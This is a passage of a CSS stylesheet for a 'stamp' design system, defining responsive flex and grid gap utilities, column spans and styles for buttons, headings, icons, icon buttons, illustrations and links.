  .stamp-flex--row-gap-tablet-xl { row-gap: var(--stamp-spacing-inner-xl); }
  .stamp-flex--row-gap-tablet-xxl { row-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-flex--row-gap-tablet-3-xl { row-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-flex--row-gap-tablet-4-xl { row-gap: var(--stamp-spacing-inner-4-xl); }
  .stamp-flex--column-gap-tablet-xxs { column-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-flex--column-gap-tablet-xs { column-gap: var(--stamp-spacing-inner-xs); }
  .stamp-flex--column-gap-tablet-s { column-gap: var(--stamp-spacing-inner-s); }
  .stamp-flex--column-gap-tablet-m { column-gap: var(--stamp-spacing-inner-m); }
  .stamp-flex--column-gap-tablet-l { column-gap: var(--stamp-spacing-inner-l); }
  .stamp-flex--column-gap-tablet-xl { column-gap: var(--stamp-spacing-inner-xl); }
  .stamp-flex--column-gap-tablet-xxl { column-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-flex--column-gap-tablet-3-xl { column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-flex--column-gap-tablet-4-xl { column-gap: var(--stamp-spacing-inner-4-xl); }
}

@media screen and (min-width: 768px) {
  .stamp-flex--row-gap-desktop-xxs { row-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-flex--row-gap-desktop-xs { row-gap: var(--stamp-spacing-inner-xs); }
  .stamp-flex--row-gap-desktop-s { row-gap: var(--stamp-spacing-inner-s); }
  .stamp-flex--row-gap-desktop-m { row-gap: var(--stamp-spacing-inner-m); }
  .stamp-flex--row-gap-desktop-l { row-gap: var(--stamp-spacing-inner-l); }
  .stamp-flex--row-gap-desktop-xl { row-gap: var(--stamp-spacing-inner-xl); }
  .stamp-flex--row-gap-desktop-xxl { row-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-flex--row-gap-desktop-3-xl { row-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-flex--row-gap-desktop-4-xl { row-gap: var(--stamp-spacing-inner-4-xl); }
  .stamp-flex--column-gap-desktop-xxs { column-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-flex--column-gap-desktop-xs { column-gap: var(--stamp-spacing-inner-xs); }
  .stamp-flex--column-gap-desktop-s { column-gap: var(--stamp-spacing-inner-s); }
  .stamp-flex--column-gap-desktop-m { column-gap: var(--stamp-spacing-inner-m); }
  .stamp-flex--column-gap-desktop-l { column-gap: var(--stamp-spacing-inner-l); }
  .stamp-flex--column-gap-desktop-xl { column-gap: var(--stamp-spacing-inner-xl); }
  .stamp-flex--column-gap-desktop-xxl { column-gap: var(--stamp-spacing-inner-xl); }
  .stamp-flex--column-gap-desktop-3-xl { column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-flex--column-gap-desktop-4-xl { column-gap: var(--stamp-spacing-inner-4-xl); }
}

.stamp-button, a.stamp-button { position: relative; display: inline-block; max-inline-size: 100%; cursor: pointer; padding-block: var(--stamp-spacing-inner-s); padding-inline: var(--stamp-spacing-inner-xl); border-style: solid; border-width: var(--stamp-border-width-s); font-family: var(--stamp-text-cta-default-font-family), sans-serif; font-weight: var(--stamp-text-cta-default-font-weight); line-height: var(--stamp-text-cta-default-line-height); font-size: var(--stamp-text-cta-default-font-size); letter-spacing: var(--stamp-text-cta-default-letter-spacing); text-decoration: none; }

.stamp-button:hover { font-family: var(--stamp-text-cta-hover-font-family), sans-serif; font-weight: var(--stamp-text-cta-hover-font-weight); line-height: var(--stamp-text-cta-hover-line-height); text-decoration: var(--stamp-text-cta-hover-text-decoration); font-size: var(--stamp-text-cta-hover-font-size); }

.stamp-button:active { font-family: var(--stamp-text-cta-pressed-font-family), sans-serif; font-weight: var(--stamp-text-cta-pressed-font-weight); line-height: var(--stamp-text-cta-pressed-line-height); text-decoration: var(--stamp-text-cta-pressed-text-decoration); font-size: var(--stamp-text-cta-pressed-font-size); }

.stamp-button--size-auto { inline-size: auto; }

.stamp-button--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-button--size-full, a.stamp-button--size-full { inline-size: auto; }
}

.stamp-button--variant-primary:focus, .stamp-button--variant-secondary:focus, .stamp-button--variant-tertiary:focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-button--variant-primary:focus, .stamp-button--variant-secondary:focus, .stamp-button--variant-tertiary:focus { outline: none; }
  .stamp-button--variant-primary:focus-visible, .stamp-button--variant-secondary:focus-visible, .stamp-button--variant-tertiary:focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-button--variant-primary, a.stamp-button--variant-primary { background-color: var(--stamp-color-background-button-primary-default); border-color: var(--stamp-color-border-button-primary-default); border-radius: var(--stamp-radius-xs); }

.stamp-button--variant-primary, a.stamp-button--variant-primary, .stamp-button--variant-primary:hover, a.stamp-button--variant-primary:hover { color: var(--stamp-color-text-button-primary-default); }

.stamp-button--variant-primary:active, a.stamp-button--variant-primary:active { background-color: var(--stamp-color-background-button-primary-pressed); color: var(--stamp-color-text-button-primary-pressed); border-color: var(--stamp-color-border-button-primary-pressed); }

.stamp-button--variant-secondary, a.stamp-button--variant-secondary { background-color: var(--stamp-color-background-button-secondary-default); border-color: var(--stamp-color-border-button-secondary-default); border-radius: var(--stamp-radius-xs); border-style: solid; }

.stamp-button--variant-secondary, a.stamp-button--variant-secondary, .stamp-button--variant-secondary:hover, a.stamp-button--variant-secondary:hover { color: var(--stamp-color-text-button-secondary-default); }

.stamp-button--variant-secondary:active, a.stamp-button--variant-secondary:active { background-color: var(--stamp-color-background-button-secondary-pressed); border-color: var(--stamp-color-border-button-secondary-pressed); color: var(--stamp-color-text-button-secondary-pressed); }

.stamp-button--variant-tertiary, a.stamp-button--variant-tertiary { background-color: var(--stamp-color-background-button-tertiary-default); border-color: var(--stamp-color-border-button-tertiary-default); border-radius: var(--stamp-radius-xs); }

.stamp-button--variant-tertiary, a.stamp-button--variant-tertiary, .stamp-button--variant-tertiary:hover, a.stamp-button--variant-tertiary:hover { color: var(--stamp-color-text-button-tertiary-default); }

.stamp-button--variant-tertiary:active, a.stamp-button--variant-tertiary:active { background-color: var(--stamp-color-background-button-tertiary-pressed); border-color: var(--stamp-color-border-button-tertiary-pressed); color: var(--stamp-color-text-button-tertiary-pressed); }

.stamp-button__icon { display: flex; justify-content: center; align-items: center; max-inline-size: var(--stamp-size-icon-s); max-block-size: var(--stamp-size-icon-s); }

.stamp-button--variant-primary .stamp-button__icon, .stamp-button--variant-primary .stamp-button__spinner { color: var(--stamp-color-icon-button-primary-default); }

.stamp-button--variant-primary:active .stamp-button__icon { color: var(--stamp-color-icon-button-primary-pressed); }

.stamp-button--variant-secondary .stamp-button__icon, .stamp-button--variant-secondary .stamp-button__spinner { color: var(--stamp-color-icon-button-secondary-default); }

.stamp-button--variant-secondary:active .stamp-button__icon { color: var(--stamp-color-icon-button-secondary-pressed); }

.stamp-button--variant-tertiary .stamp-button__icon, .stamp-button--variant-tertiary .stamp-button__spinner { color: var(--stamp-color-icon-button-tertiary-default); }

.stamp-button--variant-tertiary:active .stamp-button__icon { color: var(--stamp-color-icon-button-tertiary-pressed); }

.stamp-button__content { display: inline-flex; vertical-align: middle; gap: var(--stamp-spacing-inner-s); align-items: center; justify-content: center; max-inline-size: 100%; inline-size: 100%; text-decoration: inherit; }

.stamp-button--loading .stamp-button__content { visibility: hidden; }

.stamp-button__overlay { position: absolute; inset: 0px; inline-size: 100%; block-size: 100%; z-index: 1; display: flex; align-items: center; justify-content: center; }

.stamp-form { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-xl); }

.stamp-column--span-mobile-1 { grid-column-end: span 1; }

.stamp-column--span-mobile-2 { grid-column-end: span 2; }

.stamp-column--span-mobile-3 { grid-column-end: span 3; }

.stamp-column--span-mobile-4 { grid-column-end: span 4; }

.stamp-column--span-mobile-5 { grid-column-end: span 5; }

.stamp-column--span-mobile-6 { grid-column-end: span 6; }

.stamp-column--span-mobile-7 { grid-column-end: span 7; }

.stamp-column--span-mobile-8 { grid-column-end: span 8; }

.stamp-column--span-mobile-9 { grid-column-end: span 9; }

.stamp-column--span-mobile-10 { grid-column-end: span 10; }

.stamp-column--span-mobile-11 { grid-column-end: span 11; }

.stamp-column--span-mobile-12 { grid-column-end: span 12; }

@media screen and (min-width: 481px) {
  .stamp-column--span-tablet-1 { grid-column-end: span 1; }
  .stamp-column--span-tablet-2 { grid-column-end: span 2; }
  .stamp-column--span-tablet-3 { grid-column-end: span 3; }
  .stamp-column--span-tablet-4 { grid-column-end: span 4; }
  .stamp-column--span-tablet-5 { grid-column-end: span 5; }
  .stamp-column--span-tablet-6 { grid-column-end: span 6; }
  .stamp-column--span-tablet-7 { grid-column-end: span 7; }
  .stamp-column--span-tablet-8 { grid-column-end: span 8; }
  .stamp-column--span-tablet-9 { grid-column-end: span 9; }
  .stamp-column--span-tablet-10 { grid-column-end: span 10; }
  .stamp-column--span-tablet-11 { grid-column-end: span 11; }
  .stamp-column--span-tablet-12 { grid-column-end: span 12; }
}

@media screen and (min-width: 768px) {
  .stamp-column--span-desktop-1 { grid-column-end: span 1; }
  .stamp-column--span-desktop-2 { grid-column-end: span 2; }
  .stamp-column--span-desktop-3 { grid-column-end: span 3; }
  .stamp-column--span-desktop-4 { grid-column-end: span 4; }
  .stamp-column--span-desktop-5 { grid-column-end: span 5; }
  .stamp-column--span-desktop-6 { grid-column-end: span 6; }
  .stamp-column--span-desktop-7 { grid-column-end: span 7; }
  .stamp-column--span-desktop-8 { grid-column-end: span 8; }
  .stamp-column--span-desktop-9 { grid-column-end: span 9; }
  .stamp-column--span-desktop-10 { grid-column-end: span 10; }
  .stamp-column--span-desktop-11 { grid-column-end: span 11; }
  .stamp-column--span-desktop-12 { grid-column-end: span 12; }
}

.stamp-column--start-mobile-1 { grid-column-start: 1; }

.stamp-column--start-mobile-2 { grid-column-start: 2; }

.stamp-column--start-mobile-3 { grid-column-start: 3; }

.stamp-column--start-mobile-4 { grid-column-start: 4; }

.stamp-column--start-mobile-5 { grid-column-start: 5; }

.stamp-column--start-mobile-6 { grid-column-start: 6; }

.stamp-column--start-mobile-7 { grid-column-start: 7; }

.stamp-column--start-mobile-8 { grid-column-start: 8; }

.stamp-column--start-mobile-9 { grid-column-start: 9; }

.stamp-column--start-mobile-10 { grid-column-start: 10; }

.stamp-column--start-mobile-11 { grid-column-start: 11; }

.stamp-column--start-mobile-12 { grid-column-start: 12; }

@media screen and (min-width: 481px) {
  .stamp-column--start-tablet-1 { grid-column-start: 1; }
  .stamp-column--start-tablet-2 { grid-column-start: 2; }
  .stamp-column--start-tablet-3 { grid-column-start: 3; }
  .stamp-column--start-tablet-4 { grid-column-start: 4; }
  .stamp-column--start-tablet-5 { grid-column-start: 5; }
  .stamp-column--start-tablet-6 { grid-column-start: 6; }
  .stamp-column--start-tablet-7 { grid-column-start: 7; }
  .stamp-column--start-tablet-8 { grid-column-start: 8; }
  .stamp-column--start-tablet-9 { grid-column-start: 9; }
  .stamp-column--start-tablet-10 { grid-column-start: 10; }
  .stamp-column--start-tablet-11 { grid-column-start: 11; }
  .stamp-column--start-tablet-12 { grid-column-start: 12; }
}

@media screen and (min-width: 768px) {
  .stamp-column--start-desktop-1 { grid-column-start: 1; }
  .stamp-column--start-desktop-2 { grid-column-start: 2; }
  .stamp-column--start-desktop-3 { grid-column-start: 3; }
  .stamp-column--start-desktop-4 { grid-column-start: 4; }
  .stamp-column--start-desktop-5 { grid-column-start: 5; }
  .stamp-column--start-desktop-6 { grid-column-start: 6; }
  .stamp-column--start-desktop-7 { grid-column-start: 7; }
  .stamp-column--start-desktop-8 { grid-column-start: 8; }
  .stamp-column--start-desktop-9 { grid-column-start: 9; }
  .stamp-column--start-desktop-10 { grid-column-start: 10; }
  .stamp-column--start-desktop-11 { grid-column-start: 11; }
  .stamp-column--start-desktop-12 { grid-column-start: 12; }
}

.stamp-grid { display: grid; grid-template-columns: repeat(12, 1fr); inline-size: 100%; }

.stamp-grid--row-gap-mobile-xxs { row-gap: var(--stamp-spacing-inner-xxs); }

.stamp-grid--row-gap-mobile-xs { row-gap: var(--stamp-spacing-inner-xs); }

.stamp-grid--row-gap-mobile-s { row-gap: var(--stamp-spacing-inner-s); }

.stamp-grid--row-gap-mobile-m { row-gap: var(--stamp-spacing-inner-m); }

.stamp-grid--row-gap-mobile-l { row-gap: var(--stamp-spacing-inner-l); }

.stamp-grid--row-gap-mobile-xl { row-gap: var(--stamp-spacing-inner-xl); }

.stamp-grid--row-gap-mobile-xxl { row-gap: var(--stamp-spacing-inner-xxl); }

.stamp-grid--row-gap-mobile-3-xl { row-gap: var(--stamp-spacing-inner-3-xl); }

.stamp-grid--row-gap-mobile-4-xl { row-gap: var(--stamp-spacing-inner-4-xl); }

.stamp-grid--column-gap-mobile-xxs { column-gap: var(--stamp-spacing-inner-xxs); }

.stamp-grid--column-gap-mobile-xs { column-gap: var(--stamp-spacing-inner-xs); }

.stamp-grid--column-gap-mobile-s { column-gap: var(--stamp-spacing-inner-s); }

.stamp-grid--column-gap-mobile-m { column-gap: var(--stamp-spacing-inner-m); }

.stamp-grid--column-gap-mobile-l { column-gap: var(--stamp-spacing-inner-l); }

.stamp-grid--column-gap-mobile-xl { column-gap: var(--stamp-spacing-inner-xl); }

.stamp-grid--column-gap-mobile-xxl { column-gap: var(--stamp-spacing-inner-xxl); }

.stamp-grid--column-gap-mobile-3-xl { column-gap: var(--stamp-spacing-inner-3-xl); }

.stamp-grid--column-gap-mobile-4-xl { column-gap: var(--stamp-spacing-inner-4-xl); }

@media screen and (min-width: 481px) {
  .stamp-grid--row-gap-tablet-xxs { row-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-grid--row-gap-tablet-xs { row-gap: var(--stamp-spacing-inner-xs); }
  .stamp-grid--row-gap-tablet-s { row-gap: var(--stamp-spacing-inner-s); }
  .stamp-grid--row-gap-tablet-m { row-gap: var(--stamp-spacing-inner-m); }
  .stamp-grid--row-gap-tablet-l { row-gap: var(--stamp-spacing-inner-l); }
  .stamp-grid--row-gap-tablet-xl { row-gap: var(--stamp-spacing-inner-xl); }
  .stamp-grid--row-gap-tablet-xxl { row-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-grid--row-gap-tablet-3-xl { row-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-grid--row-gap-tablet-4-xl { row-gap: var(--stamp-spacing-inner-4-xl); }
  .stamp-grid--column-gap-tablet-xxs { column-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-grid--column-gap-tablet-xs { column-gap: var(--stamp-spacing-inner-xs); }
  .stamp-grid--column-gap-tablet-s { column-gap: var(--stamp-spacing-inner-s); }
  .stamp-grid--column-gap-tablet-m { column-gap: var(--stamp-spacing-inner-m); }
  .stamp-grid--column-gap-tablet-l { column-gap: var(--stamp-spacing-inner-l); }
  .stamp-grid--column-gap-tablet-xl { column-gap: var(--stamp-spacing-inner-xl); }
  .stamp-grid--column-gap-tablet-xxl { column-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-grid--column-gap-tablet-3-xl { column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-grid--column-gap-tablet-4-xl { column-gap: var(--stamp-spacing-inner-4-xl); }
}

@media screen and (min-width: 768px) {
  .stamp-grid--row-gap-desktop-xxs { row-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-grid--row-gap-desktop-xs { row-gap: var(--stamp-spacing-inner-xs); }
  .stamp-grid--row-gap-desktop-s { row-gap: var(--stamp-spacing-inner-s); }
  .stamp-grid--row-gap-desktop-m { row-gap: var(--stamp-spacing-inner-m); }
  .stamp-grid--row-gap-desktop-l { row-gap: var(--stamp-spacing-inner-l); }
  .stamp-grid--row-gap-desktop-xl { row-gap: var(--stamp-spacing-inner-xl); }
  .stamp-grid--row-gap-desktop-xxl { row-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-grid--row-gap-desktop-3-xl { row-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-grid--row-gap-desktop-4-xl { row-gap: var(--stamp-spacing-inner-4-xl); }
  .stamp-grid--column-gap-desktop-xxs { column-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-grid--column-gap-desktop-xs { column-gap: var(--stamp-spacing-inner-xs); }
  .stamp-grid--column-gap-desktop-s { column-gap: var(--stamp-spacing-inner-s); }
  .stamp-grid--column-gap-desktop-m { column-gap: var(--stamp-spacing-inner-m); }
  .stamp-grid--column-gap-desktop-l { column-gap: var(--stamp-spacing-inner-l); }
  .stamp-grid--column-gap-desktop-xl { column-gap: var(--stamp-spacing-inner-xl); }
  .stamp-grid--column-gap-desktop-xxl { column-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-grid--column-gap-desktop-3-xl { column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-grid--column-gap-desktop-4-xl { column-gap: var(--stamp-spacing-inner-4-xl); }
}

.stamp-heading { font-feature-settings: normal; }

.stamp-heading--size-xxs { letter-spacing: var(--stamp-text-heading-xxs-letter-spacing); line-height: var(--stamp-text-heading-xxs-line-height); font-weight: var(--stamp-text-heading-xxs-font-weight); font-family: var(--stamp-text-heading-xxs-font-family); font-size: var(--stamp-text-heading-xxs-font-size); }

.stamp-heading--size-xs { letter-spacing: var(--stamp-text-heading-xs-letter-spacing); line-height: var(--stamp-text-heading-xs-line-height); font-weight: var(--stamp-text-heading-xs-font-weight); font-family: var(--stamp-text-heading-xs-font-family); font-size: var(--stamp-text-heading-xs-font-size); }

.stamp-heading--size-s { letter-spacing: var(--stamp-text-heading-s-letter-spacing); line-height: var(--stamp-text-heading-s-line-height); font-weight: var(--stamp-text-heading-s-font-weight); font-family: var(--stamp-text-heading-s-font-family); font-size: var(--stamp-text-heading-xs-font-size); }

.stamp-heading--size-m { letter-spacing: var(--stamp-text-heading-m-letter-spacing); line-height: var(--stamp-text-heading-m-line-height); font-weight: var(--stamp-text-heading-m-font-weight); font-family: var(--stamp-text-heading-m-font-family); font-size: var(--stamp-text-heading-s-font-size); }

.stamp-heading--size-l { letter-spacing: var(--stamp-text-heading-l-letter-spacing); line-height: var(--stamp-text-heading-l-line-height); font-weight: var(--stamp-text-heading-l-font-weight); font-family: var(--stamp-text-heading-l-font-family); font-size: var(--stamp-text-heading-m-font-size); }

.stamp-heading--size-xl { letter-spacing: var(--stamp-text-heading-xl-letter-spacing); line-height: var(--stamp-text-heading-xl-line-height); font-weight: var(--stamp-text-heading-xl-font-weight); font-family: var(--stamp-text-heading-xl-font-family); font-size: var(--stamp-text-heading-l-font-size); }

.stamp-heading--size-xxl { letter-spacing: var(--stamp-text-heading-xxl-letter-spacing); line-height: var(--stamp-text-heading-xxl-line-height); font-weight: var(--stamp-text-heading-xxl-font-weight); font-family: var(--stamp-text-heading-xxl-font-family); font-size: var(--stamp-text-heading-xl-font-size); }

.stamp-heading--size-3-xl { letter-spacing: var(--stamp-text-heading-3-xl-letter-spacing); line-height: var(--stamp-text-heading-3-xl-line-height); font-weight: var(--stamp-text-heading-3-xl-font-weight); font-family: var(--stamp-text-heading-3-xl-font-family); font-size: var(--stamp-text-heading-xl-font-size); }

@media (min-width: 681px) {
  .stamp-heading--size-xs { font-size: var(--stamp-text-heading-xs-font-size); }
  .stamp-heading--size-s { font-size: var(--stamp-text-heading-s-font-size); }
  .stamp-heading--size-m { font-size: var(--stamp-text-heading-m-font-size); }
  .stamp-heading--size-l { font-size: var(--stamp-text-heading-l-font-size); }
  .stamp-heading--size-xl { font-size: var(--stamp-text-heading-xl-font-size); }
  .stamp-heading--size-xxl { font-size: var(--stamp-text-heading-xxl-font-size); }
  .stamp-heading--size-3-xl { font-size: var(--stamp-text-heading-3-xl-font-size); }
}

.stamp-heading--color-on-brand { color: var(--stamp-color-heading-on-brand); }

.stamp-heading--color-subtle { color: var(--stamp-color-heading-subtle); }

.stamp-heading--color-brand { color: var(--stamp-color-heading-brand); }

.stamp-heading--color-default { color: var(--stamp-color-heading-default); }

.stamp-icon { display: flex; }

.stamp-icon--size-s { inline-size: var(--stamp-size-icon-s); block-size: var(--stamp-size-icon-s); }

.stamp-icon--size-m { inline-size: var(--stamp-size-icon-m); block-size: var(--stamp-size-icon-m); }

.stamp-icon--size-l { inline-size: var(--stamp-size-icon-l); block-size: var(--stamp-size-icon-l); }

.stamp-icon__content { inline-size: inherit; block-size: inherit; display: flex; }

.stamp-icon svg { inline-size: 100%; block-size: 100%; }

.stamp-icon-button { display: inline-flex; flex-direction: column; align-items: center; justify-content: center; gap: var(--stamp-spacing-inner-s); }

.stamp-icon-button__button { display: inline-flex; gap: var(--stamp-spacing-inner-s); align-items: center; aspect-ratio: 1 / 1; max-inline-size: 100%; cursor: pointer; padding: var(--stamp-spacing-inner-s); border: medium; border-radius: var(--stamp-radius-xs); }

.stamp-icon-button__button:hover { font-family: var(--stamp-text-cta-hover-font-family), sans-serif; font-weight: var(--stamp-text-cta-hover-font-weight); line-height: var(--stamp-text-cta-hover-line-height); text-decoration: var(--stamp-text-cta-hover-text-decoration); font-size: var(--stamp-text-cta-hover-font-size); }

.stamp-icon-button__button:active { font-family: var(--stamp-text-cta-pressed-font-family), sans-serif; font-weight: var(--stamp-text-cta-pressed-font-weight); line-height: var(--stamp-text-cta-pressed-line-height); text-decoration: var(--stamp-text-cta-pressed-text-decoration); font-size: var(--stamp-text-cta-pressed-font-size); }

.stamp-icon-button__button--variant-primary:focus, .stamp-icon-button__button--variant-secondary:focus, .stamp-icon-button__button--variant-tertiary:focus { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }

@supports selector(:focus-visible) {
  .stamp-icon-button__button--variant-primary:focus, .stamp-icon-button__button--variant-secondary:focus, .stamp-icon-button__button--variant-tertiary:focus { outline: none; }
  .stamp-icon-button__button--variant-primary:focus-visible, .stamp-icon-button__button--variant-secondary:focus-visible, .stamp-icon-button__button--variant-tertiary:focus-visible { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }
}

.stamp-icon-button__button--variant-primary { background-color: var(--stamp-color-background-icon-button-primary-default); color: var(--stamp-color-icon-button-primary-default); }

.stamp-icon-button__button--variant-primary:active { background-color: var(--stamp-color-background-icon-button-primary-pressed); color: var(--stamp-color-icon-button-primary-pressed); }

.stamp-icon-button__button--variant-secondary { background-color: var(--stamp-color-background-icon-button-secondary-default); color: var(--stamp-color-icon-button-secondary-default); }

.stamp-icon-button__button--variant-secondary:active { background-color: var(--stamp-color-background-icon-button-secondary-pressed); color: var(--stamp-color-icon-button-secondary-pressed); }

.stamp-icon-button__button--variant-tertiary { background-color: var(--stamp-color-background-icon-button-tertiary-default); color: var(--stamp-color-icon-button-tertiary-default); }

.stamp-icon-button__button--variant-tertiary:active { background-color: var(--stamp-color-background-icon-button-tertiary-pressed); color: var(--stamp-color-icon-button-tertiary-pressed); }

.stamp-icon-button__button--size-s, .stamp-icon-button__button--size-m { padding: var(--stamp-spacing-inner-xs); }

.stamp-icon-button__button--size-l { padding: var(--stamp-spacing-inner-s); }

.stamp-icon-button__label { color: var(--stamp-color-text-icon-button-default); font-family: var(--stamp-text-cta-default-font-family), sans-serif; font-weight: var(--stamp-text-cta-default-font-weight); line-height: var(--stamp-text-cta-default-line-height); font-size: var(--stamp-text-cta-default-font-size); letter-spacing: var(--stamp-text-cta-default-letter-spacing); }

.stamp-icon-button__button:hover + .stamp-icon-button__label { font-family: var(--stamp-text-cta-hover-font-family), sans-serif; font-weight: var(--stamp-text-cta-hover-font-weight); line-height: var(--stamp-text-cta-hover-line-height); text-decoration: var(--stamp-text-cta-hover-text-decoration); font-size: var(--stamp-text-cta-hover-font-size); }

.stamp-icon-button__button:active + .stamp-icon-button__label { color: var(--stamp-color-text-icon-button-pressed); font-family: var(--stamp-text-cta-pressed-font-family), sans-serif; font-weight: var(--stamp-text-cta-pressed-font-weight); line-height: var(--stamp-text-cta-pressed-line-height); text-decoration: var(--stamp-text-cta-pressed-text-decoration); font-size: var(--stamp-text-cta-pressed-font-size); }

.stamp-illustration { --aspect-ratio-standard: 1/1; --aspect-ratio-medium: 6/5; display: flex; justify-content: center; align-items: center; inline-size: var(--stamp-size-illustration-m); }

.stamp-illustration--size-s { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-s); }

.stamp-illustration--size-m { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-m); }

.stamp-illustration--size-l { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-l); }

.stamp-illustration--size-xl { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-xl); }

.stamp-illustration--size-xxl { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-xxl); }

.stamp-illustration--size-medium-s { aspect-ratio: var(--aspect-ratio-medium); inline-size: var(--stamp-size-medium-illustration-s); }

.stamp-illustration--size-medium-m { aspect-ratio: var(--aspect-ratio-medium); inline-size: var(--stamp-size-medium-illustration-m); }

.stamp-illustration svg { inline-size: 100%; }

.stamp-image { inline-size: 100%; block-size: auto; }

.stamp-link, a.stamp-link { display: inline; cursor: pointer; border-radius: var(--stamp-radius-xs); border: medium; background: none; text-decoration: none; padding: 0px; color: var(--stamp-color-text-link-default); font-family: var(--stamp-text-link-l-default-font-family), sans-serif; font-weight: var(--stamp-text-link-l-default-font-weight); font-size: var(--stamp-text-link-l-default-font-size); line-height: var(--stamp-text-link-l-default-line-height); letter-spacing: var(--stamp-text-link-l-default-letter-spacing); }

.stamp-link:hover, a.stamp-link:hover { color: var(--stamp-color-text-link-hover); }

.stamp-link:active, a.stamp-link:active { color: var(--stamp-color-text-link-pressed); }

.stamp-link:focus, a.stamp-link:focus { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 3px; }

@supports selector(:focus-visible) {
  .stamp-link:focus, a.stamp-link:focus { outline: none; }
  .stamp-link:focus-visible, a.stamp-link:focus-visible { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 3px; }
}

.stamp-link__icon { display: inline-flex; justify-content: center; vertical-align: middle; }

.stamp-link__icon--start { max-inline-size: var(--stamp-size-icon-m); max-block-size: var(--stamp-size-icon-m); margin-inline-end: var(--stamp-spacing-inner-xs); }

.stamp-link__icon--start svg { inline-size: var(--stamp-size-icon-m); block-size: var(--stamp-size-icon-m); }

.stamp-link__icon--end { align-items: center; margin-inline-start: var(--stamp-spacing-inner-xs); max-inline-size: var(--stamp-size-icon-s); max-block-size: var(--stamp-size-icon-s); }

.stamp-link__icon--end svg { inline-size: var(--stamp-size-icon-s); block-size: var(--stamp-size-icon-s); }

.stamp-link--size-s, a.stamp-link--size-s { font-family: var(--stamp-text-link-s-default-font-family), sans-serif; font-weight: var(--stamp-text-link-s-default-font-weight); font-size: var(--stamp-text-link-s-default-font-size); line-height: var(--stamp-text-link-s-default-line-height); letter-spacing: var(--stamp-text-link-s-default-letter-spacing); }

.stamp-link--size-s:active, a.stamp-link--size-s:active { font-family: var(--stamp-text-link-s-pressed-font-family), sans-serif; font-weight: var(--stamp-text-link-s-pressed-font-weight); font-size: var(--stamp-text-link-s-pressed-font-size); line-height: var(--stamp-text-link-s-pressed-line-height); letter-spacing: var(--stamp-text-link-s-pressed-letter-spacing); text-decoration: var(--stamp-text-link-s-pressed-text-decoration); }

.stamp-link--size-s:hover, a.stamp-link--size-s:hover { font-family: var(--stamp-text-link-s-hover-font-family), sans-serif; font-weight: var(--stamp-text-link-s-hover-font-weight); font-size: var(--stamp-text-link-s-hover-font-size); line-height: var(--stamp-text-link-s-hover-line-height); letter-spacing: var(--stamp-text-link-s-hover-letter-spacing); text-decoration: var(--stamp-text-link-s-hover-text-decoration); }

.stamp-link--size-m, a.stamp-link--size-m { font-family: var(--stamp-text-link-m-default-font-family), sans-serif; font-weight: var(--stamp-text-link-m-default-font-weight); font-size: var(--stamp-text-link-m-default-font-size); line-height: var(--stamp-text-link-m-default-line-height); letter-spacing: var(--stamp-text-link-m-default-letter-spacing); }

.stamp-link--size-m:active, a.stamp-link--size-m:active { font-family: var(--stamp-text-link-m-pressed-font-family), sans-serif; font-weight: var(--stamp-text-link-m-pressed-font-weight); font-size: var(--stamp-text-link-m-pressed-font-size); line-height: var(--stamp-text-link-m-pressed-line-height); letter-spacing: var(--stamp-text-link-m-pressed-letter-spacing); text-decoration: var(--stamp-text-link-m-pressed-text-decoration); }

.stamp-link--size-m:hover, a.stamp-link--size-m:hover { font-family: var(--stamp-text-link-m-hover-font-family), sans-serif; font-weight: var(--stamp-text-link-m-hover-font-weight); font-size: var(--stamp-text-link-m-hover-font-size); line-height: var(--stamp-text-link-m-hover-line-height); letter-spacing: var(--stamp-text-link-m-hover-letter-spacing); text-decoration: var(--stamp-text-link-m-hover-text-decoration); }

.stamp-link--size-l, a.stamp-link--size-l { font-family: var(--stamp-text-link-l-default-font-family), sans-serif; font-weight: var(--stamp-text-link-l-default-font-weight); font-size: var(--stamp-text-link-l-default-font-size); line-height: var(--stamp-text-link-l-default-line-height); letter-spacing: var(--stamp-text-link-l-default-letter-spacing); }

